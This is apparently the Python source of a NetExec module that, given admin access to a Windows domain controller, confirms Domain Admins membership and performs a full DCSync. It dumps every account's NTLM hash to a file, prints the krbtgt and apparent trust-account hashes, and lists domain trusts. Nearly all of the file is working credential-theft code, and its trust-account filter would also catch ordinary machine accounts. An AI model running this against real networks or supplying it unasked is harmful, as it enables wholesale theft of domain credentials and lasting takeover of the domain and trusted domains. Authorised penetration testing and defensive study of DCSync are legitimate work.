from impacket.dcerpc.v5 import samr, transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from contextlib import suppress
import traceback
from nxc.helpers.misc import CATEGORY, validate_ntlm
from nxc.parsers.ldap_results import parse_result_attributes


class NXCModule:
    """
    Module to perform DCSync, display krbtgt and trust hashes, and enumerate domain trusts.
    
    This module performs the following functions:
    1. Checks if the authenticated user is a member of the Domain Admins group (RID 512)
    2. If Domain Admin, performs a full DCSync against the DC and saves to a txt file
    3. Displays the krbtgt user hash (NTLM) on screen
    4. Displays hashes of trust accounts (associated domain hashes) if they exist
    5. Enumerates and displays domain trust relationships
    
    Requirements:
    - SMB connection with administrative privileges
    - Domain Controller access for SAMR and NTDS operations
    
    Usage:
        nxc smb <dc_ip> -u <username> -p <password> -M dcsync_trusts
    
    Output:
    - Displays whether the user is a Domain Administrator
    - If Domain Admin:
      - Performs full DCSync and saves to file
      - Displays krbtgt NTLM hash
      - Displays trust account hashes
      - Displays domain trust relationships
    """

    name = "dcsync_trusts"
    description = "DCSync all hashes, display krbtgt and trust hashes, enumerate domain trusts"
    supported_protocols = ["smb"]
    category = CATEGORY.ENUMERATION

    def options(self, context, module_options):
        """No module options available"""
        pass

    def on_admin_login(self, context, connection):
        """Execute when admin login is successful"""
        try:
            # Check if current user is a Domain Admin
            is_domain_admin = self.check_domain_admin(context, connection)
            
            if is_domain_admin:
                context.log.success(f"User {connection.username} is a Domain Administrator!")
                
                # Perform DCSync and extract hashes
                self.perform_dcsync(context, connection)
                
                # Enumerate domain trusts
                self.enumerate_trusts(context, connection)
            else:
                context.log.fail(f"User {connection.username} is NOT a Domain Administrator")
                context.log.fail("Domain Admin privileges required for DCSync operations")
                
        except Exception as e:
            context.log.fail(f"Error in dcsync_trusts module: {e}")
            context.log.debug(traceback.format_exc())

    def get_dce_rpc(self, target, string_binding, dce_binding, connection):
        """Create DCE/RPC connection"""
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.setRemoteHost(target)
        rpctransport.set_credentials(
            connection.username,
            connection.password,
            connection.domain,
            connection.lmhash,
            connection.nthash,
            aesKey=connection.aesKey,
        )
        rpctransport.set_kerberos(connection.kerberos, connection.kdcHost)

        dce = rpctransport.get_dce_rpc()
        if connection.kerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_credentials(*rpctransport.get_credentials())
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(dce_binding)
        return dce

    def check_domain_admin(self, context, connection):
        """Check if the current user is a member of Domain Admins group"""
        try:
            # Connect to SAMR
            string_binding = fr"ncacn_np:{connection.kdcHost}[\pipe\samr]"
            dce = self.get_dce_rpc(connection.kdcHost, string_binding, samr.MSRPC_UUID_SAMR, connection)
            
            # Get domain information
            server_handle = samr.hSamrConnect2(dce)["ServerHandle"]
            domain = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)["Buffer"]["Buffer"][0]["Name"]
            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)
            domain_sid = resp["DomainId"].formatCanonical()
            domain_handle = samr.hSamrOpenDomain(dce, server_handle, samr.DOMAIN_LOOKUP | samr.DOMAIN_LIST_ACCOUNTS, resp["DomainId"])["DomainHandle"]
            
            context.log.debug(f"Resolved domain SID: {domain_sid}")
            
            # Domain Admins RID is 512
            domain_admin_rid = 512
            
            try:
                # Open Domain Admins group
                group_handle = samr.hSamrOpenGroup(dce, domain_handle, samr.GROUP_LIST_MEMBERS, domain_admin_rid)["GroupHandle"]
                resp = samr.hSamrGetMembersInGroup(dce, group_handle)
                
                # Check if current user is in the group
                for member in resp["Members"]["Members"]:
                    rid = int.from_bytes(member.getData(), byteorder="little")
                    try:
                        user_handle = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, rid)["UserHandle"]
                        username = samr.hSamrQueryInformationUser2(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)["Buffer"]["All"]["UserName"]
                        
                        if username.lower() == connection.username.lower():
                            context.log.debug(f"Found {username} in Domain Admins group")
                            return True
                            
                    except Exception as e:
                        context.log.debug(f"Failed to get user info for RID {rid}: {e}")
                    finally:
                        with suppress(Exception):
                            samr.hSamrCloseHandle(dce, user_handle)
                            
            except Exception as e:
                context.log.debug(f"Failed to get members of Domain Admins group: {e}")
            finally:
                with suppress(Exception):
                    samr.hSamrCloseHandle(dce, group_handle)
                    
            return False
            
        except Exception as e:
            context.log.fail(f"Error in check_domain_admin: {e}")
            context.log.debug(traceback.format_exc())
            return False

    def perform_dcsync(self, context, connection):
        """Perform DCSync and extract all hashes, highlight krbtgt and trust accounts"""
        try:
            context.log.info("Starting DCSync operation...")
            
            # Enable remote operations
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()
            
            # Get bootkey
            try:
                bootkey = remote_ops.getBootKey()
            except Exception as e:
                context.log.fail(f"Failed to get bootkey: {e}")
                return
                
            # Initialize storage for special hashes
            self.krbtgt_hash = None
            self.trust_hashes = []
            self.all_hashes = []
            
            def hash_callback(secret_type, secret):
                """Callback to capture all hashes and identify special ones"""
                if secret and ":" in secret:
                    # Store all hashes
                    self.all_hashes.append(secret)
                    
                    parts = secret.split(":")
                    if len(parts) >= 4:
                        username = parts[0].split("\\")[-1] if "\\" in parts[0] else parts[0]
                        
                        # Check for krbtgt
                        if username.lower() == "krbtgt":
                            lmhash = parts[2]
                            nthash = parts[3]
                            self.krbtgt_hash = f"{username}:{nthash}"
                        
                        # Check for trust accounts (end with $)
                        elif username.endswith("$") and not username.lower().endswith("_machineaccount$"):
                            # Trust accounts typically have specific naming patterns
                            # They often contain domain names and end with $
                            lmhash = parts[2]
                            nthash = parts[3]
                            self.trust_hashes.append(f"{username}:{nthash}")
            
            # Perform DCSync with output file
            use_vss_method = False
            NTDSFileName = None
            output_file = f"dcsync_{connection.host}.txt"
            
            NTDS = NTDSHashes(
                NTDSFileName,
                bootkey,
                isRemote=True,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=use_vss_method,
                justNTLM=True,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=output_file,
                justUser=None,  # Dump all users
                printUserStatus=True,
                perSecretCallback=lambda secret_type, secret: hash_callback(secret_type, secret),
            )
            
            context.log.info("Dumping NTDS (this may take a while)...")
            NTDS.dump()
            
            # Display results
            context.log.success(f"DCSync completed! {len(self.all_hashes)} hashes dumped to {output_file}.ntds")
            
            # Display krbtgt hash
            if self.krbtgt_hash:
                context.log.success("krbtgt account hash:")
                context.log.highlight(f"  {self.krbtgt_hash}")
            else:
                context.log.fail("krbtgt hash not found")
            
            # Display trust account hashes
            if self.trust_hashes:
                context.log.success(f"Found {len(self.trust_hashes)} trust account hash(es):")
                for trust_hash in self.trust_hashes:
                    context.log.highlight(f"  {trust_hash}")
            else:
                context.log.info("No trust account hashes found")
                
            # Cleanup
            try:
                remote_ops.finish()
            except Exception as e:
                context.log.debug(f"Error in remote_ops.finish(): {e}")
            
            NTDS.finish()
                
        except Exception as e:
            context.log.fail(f"Error during DCSync: {e}")
            context.log.debug(traceback.format_exc())

    def enumerate_trusts(self, context, connection):
        """Enumerate domain trust relationships"""
        try:
            context.log.info("Enumerating domain trust relationships...")
            
            # We need to use LDAP for trust enumeration
            # Import here to avoid circular dependencies
            from impacket.ldap import ldap as ldap_impacket
            from impacket.ldap import ldapasn1 as ldapasn1_impacket
            
            # Create LDAP connection
            try:
                ldap_conn = ldap_impacket.LDAPConnection(f"ldap://{connection.kdcHost}")
                if connection.kerberos:
                    ldap_conn.kerberosLogin(
                        connection.username,
                        connection.password,
                        connection.domain,
                        connection.lmhash,
                        connection.nthash,
                        connection.aesKey,
                        connection.kdcHost
                    )
                else:
                    ldap_conn.login(
                        connection.username,
                        connection.password,
                        connection.domain,
                        connection.lmhash,
                        connection.nthash
                    )
            except Exception as e:
                context.log.fail(f"Failed to establish LDAP connection: {e}")
                return
            
            # Search for trusted domains
            search_filter = "(objectClass=trustedDomain)"
            attributes = ["name", "trustDirection", "trustType", "trustAttributes", "flatName"]
            
            try:
                resp = ldap_conn.search(
                    searchFilter=search_filter,
                    attributes=attributes,
                    sizeLimit=0
                )
            except Exception as e:
                context.log.fail(f"Failed to query trusts: {e}")
                return
            
            # Parse results
            trusts_found = 0
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                    
                try:
                    trust_info = {}
                    for attribute in item["attributes"]:
                        attr_type = str(attribute["type"])
                        if len(attribute["vals"]) > 0:
                            attr_value = attribute["vals"][0]
                            if isinstance(attr_value, ldapasn1_impacket.LDAPSTRING):
                                trust_info[attr_type] = str(attr_value)
                            else:
                                trust_info[attr_type] = int(attr_value)
                    
                    if "name" in trust_info:
                        trusts_found += 1
                        trust_name = trust_info.get("name", "Unknown")
                        trust_flat_name = trust_info.get("flatName", "Unknown")
                        trust_direction = trust_info.get("trustDirection", 0)
                        trust_type = trust_info.get("trustType", 0)
                        
                        # Convert trust direction to text
                        direction_text = {
                            0: "Disabled",
                            1: "Inbound",
                            2: "Outbound",
                            3: "Bidirectional",
                        }.get(trust_direction, "Unknown")
                        
                        # Convert trust type to text
                        trust_type_text = {
                            1: "Windows NT",
                            2: "Active Directory",
                            3: "Kerberos",
                            4: "Unknown",
                        }.get(trust_type, "Unknown")
                        
                        context.log.highlight(f"Trust: {trust_name} ({trust_flat_name})")
                        context.log.highlight(f"  Direction: {direction_text}")
                        context.log.highlight(f"  Type: {trust_type_text}")
                        
                except Exception as e:
                    context.log.debug(f"Error parsing trust entry: {e}")
                    continue
            
            if trusts_found == 0:
                context.log.info("No trust relationships found")
            else:
                context.log.success(f"Found {trusts_found} trust relationship(s)")
                
        except Exception as e:
            context.log.fail(f"Error enumerating trusts: {e}")
            context.log.debug(traceback.format_exc())
